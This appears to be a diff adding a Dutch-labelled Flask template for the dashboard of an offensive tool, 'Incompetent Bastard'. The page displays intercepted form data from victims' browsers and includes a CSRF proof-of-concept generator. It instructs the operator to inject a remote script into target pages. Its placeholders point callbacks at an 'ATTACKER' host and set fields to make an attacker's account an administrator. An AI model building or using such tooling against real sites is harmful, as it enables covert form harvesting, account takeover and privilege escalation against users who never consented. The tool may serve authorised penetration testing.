@@ -1,0 +1,125 @@
+{% extends "bootstrap/base.html" %}
+{% block title %}Incompetent Bastard - CSRF Telemetry{% endblock %}
+
+{% block styles %}
+<link rel="stylesheet" href="{{ url_for('static', filename='css/dashboard-modern.css') }}" />
+<link rel="stylesheet" href="{{ url_for('static', filename='css/lab-generator.css') }}" />
+{% endblock %}
+
+{% block content %}
+<div class="page-title">
+  <div>
+    <h1>CSRF Telemetry</h1>
+    <div class="breadcrumbs"><a href="/">Home</a> / <a href="/">Dashboard</a> / CSRF</div>
+  </div>
+</div>
+
+<div class="grid cols-2">
+  <section class="card">
+    <div class="card-body">
+      <div class="kpi">
+        <div>
+          <div class="val accent-orange">{{ records|length }}</div>
+          <div class="sub">Harvested Forms</div>
+        </div>
+      </div>
+    </div>
+  </section>
+  <section class="card">
+    <div class="card-body">
+      <div class="kpi">
+        <div>
+          <div class="val">{{ records|selectattr('methode', 'equalto', 'POST')|list|length }}</div>
+          <div class="sub">POST Forms</div>
+        </div>
+      </div>
+    </div>
+  </section>
+</div>
+
+<section class="card mt-14">
+  <div class="card-head">
+    <h2>Onderschepte Form Data</h2>
+  </div>
+  <div class="card-body">
+    {% if records %}
+    <table class="table compact">
+      <thead>
+        <tr>
+          <th>ID</th>
+          <th>IP</th>
+          <th>Methode</th>
+          <th>Action</th>
+          <th>Data</th>
+          <th>Datum</th>
+          <th></th>
+        </tr>
+      </thead>
+      <tbody>
+        {% for r in records %}
+        <tr>
+          <td>{{ r.id }}</td>
+          <td>{{ r.ip }}</td>
+          <td>{{ r.methode }}</td>
+          <td class="max-w-200 truncate">{{ r.actie }}</td>
+          <td class="max-w-300 truncate"><code>{{ r.data }}</code></td>
+          <td>{{ r.datum }}</td>
+          <td><button class="btn-sm btn-danger csrf-delete" data-id="{{ r.id }}">&#x2715;</button></td>
+        </tr>
+        {% endfor %}
+      </tbody>
+    </table>
+    {% else %}
+    <p class="help">Geen CSRF data ontvangen. Injecteer <code>&lt;script src="HOST/csrf.js"&gt;&lt;/script&gt;</code> op een doelpagina.</p>
+    {% endif %}
+  </div>
+</section>
+
+<section class="card mt-14">
+  <div class="card-head">
+    <h2>CSRF PoC Generator</h2>
+  </div>
+  <div class="card-body" id="csrf-generator">
+    <div class="gen-section">
+      <p class="gen-note">Genereer CSRF PoC payloads: auto-submit forms, XHR, fetch, JSON CSRF, iframe, file upload. Velden als <code>key=value</code> per regel of <code>key=value&amp;key2=value2</code>.</p>
+      <div class="gen-grid">
+        <div><label>Action URL (doelwit)</label><input type="text" id="csrf-action" placeholder="http://target/update-profile"></div>
+        <div><label>Method</label>
+          <select id="csrf-method"><option>POST</option><option>GET</option><option>PUT</option><option>DELETE</option><option>PATCH</option></select>
+        </div>
+        <div><label>Content-Type</label>
+          <select id="csrf-content-type">
+            <option value="form">application/x-www-form-urlencoded</option>
+            <option value="json">application/json</option>
+            <option value="multipart">multipart/form-data</option>
+          </select>
+        </div>
+        <div><label>Callback URL (IB host)</label><input type="text" id="csrf-callback" placeholder="http://ATTACKER:5000"></div>
+      </div>
+      <div class="gen-grid">
+        <div style="grid-column:1/-1"><label>Velden (key=value per regel)</label>
+          <textarea id="csrf-fields" rows="4" placeholder="username=admin&#10;email=attacker@evil.com&#10;role=administrator"></textarea>
+        </div>
+      </div>
+      <div class="gen-actions">
+        <button class="btn-sm" id="csrf-gen-btn">Genereer CSRF PoCs</button>
+      </div>
+    </div>
+    <div id="csrf-gen-output"></div>
+  </div>
+</section>
+{% endblock %}
+
+{% block scripts %}
+<script nonce="{{ csp_nonce }}" src="{{ url_for('static', filename='js/csrf-generator.js') }}"></script>
+<script nonce="{{ csp_nonce }}">
+document.querySelectorAll('.csrf-delete').forEach(function(btn) {
+  btn.addEventListener('click', function() {
+    var id = this.dataset.id;
+    fetch('/api/csrf/' + id, {method: 'DELETE'}).then(function() {
+      btn.closest('tr').remove();
+    });
+  });
+});
+</script>
+{% endblock %}
